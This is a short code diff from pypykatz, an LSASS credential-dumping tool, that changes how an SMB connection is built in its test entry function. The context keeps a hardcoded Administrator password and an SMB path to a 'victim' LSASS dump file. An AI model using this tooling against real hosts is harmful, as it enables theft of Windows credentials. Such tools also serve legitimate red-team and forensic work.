@@ -317,7 +317,7 @@ class apypykatz:
 				self.errors.append(('cloudap', e))
 
 async def amain():
-	from aiosmb.commons.connection.url import SMBConnectionURL
+	from aiosmb.commons.connection.factory import SMBConnectionFactory
 	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
 
 	import sys
@@ -325,7 +325,7 @@ async def amain():
 	print(f)
 
 	url = 'smb2+ntlm-password://TEST\\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102/C$/Users/victim/Desktop/lsass.DMP'
-	smburl = SMBConnectionURL(url)
+	smburl = SMBConnectionFactory.from_url(url)
 	connection = smburl.get_connection()
 	smbfile = smburl.get_file()
 
